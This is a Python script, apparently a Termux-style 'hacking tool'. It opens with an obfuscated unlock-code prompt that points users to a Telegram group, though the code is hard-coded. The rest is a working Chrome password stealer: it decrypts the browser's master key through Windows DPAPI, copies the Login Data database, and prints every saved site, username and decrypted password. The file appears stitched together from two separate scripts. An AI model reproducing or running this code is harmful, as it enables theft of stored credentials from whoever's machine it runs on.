import time #line:3
from colorama import Fore ,Back ,Style ,init #line:4
init (autoreset =True )#line:5
def startMessage ():#line:7
    OO0O0OO0OOO0OO0O0 =input (Fore .YELLOW +"Enter Code To Unlock The Tool : ")#line:8
    OOOO0OO000OO0OOOO ="hacker_6_2_9_1"#line:9
    if OOOO0OO000OO0OOOO !=OO0O0OO0OOO0OO0O0 :#line:10
        print (Fore .RED +'[X] Wrong Code')#line:11
        print (Fore .BLUE +''' 
   1. For unlock code join my Telegram group
   2. Group Link: https://t.me/Termux_official_01
   3. Send massage for code
   4. Next time come with code and use this tool
   5. bye
    ''')#line:18
        startMessage ()#line:19
    else :#line:20
        print (Fore .GREEN +"Successfully Unlocked Tool!")#line:21
        pass #line:22
if __name__ =="__main__":#line:24
    startMessage ()#line:25
from setup.banner import banner , banner2 , clear
from setup.colors import r,c,g,y,ran
from setup.sprint import sprint






clear()
banner()
yes = ["y" , "yes"]
no = ["n" , "no"]
#Main
import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta


def chrome_date_and_time(chrome_data):
    # Chrome_data format is 'year-month-date
    # hr:mins:seconds.milliseconds
    # This will return datetime.datetime Object
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)


def fetching_encryption_key():
    # Local_computer_directory_path will look
    # like this below
    # C: => Users => <Your_Name> => AppData =>
    # Local => Google => Chrome => User Data =>
    # Local State
    local_computer_directory_path = os.path.join(
    os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
    "User Data", "Local State")
    
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
    local_state_data["os_crypt"]["encrypted_key"])
    
    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]
    
    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]


def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
        
        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"


def main():
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                        "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)
    
    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    
    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")
    
    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]
        
        if user_name or decrypted_password:
            print(f"Main URL: {main_url}")
            print(f"Login URL: {login_page_url}")
            print(f"User name: {user_name}")
            print(f"Decrypted Password: {decrypted_password}")
        
        else:
            continue
        
        if date_of_creation != 86400000000 and date_of_creation:
            print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
        
        if last_usuage != 86400000000 and last_usuage:
            print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
        print("=" * 100)
    cursor.close()
    db.close()
    
    try:
        
        # trying to remove the copied db file as
        # well from local computer
        os.remove(filename)
    except:
        pass


if __name__ == "__main__":
    main()
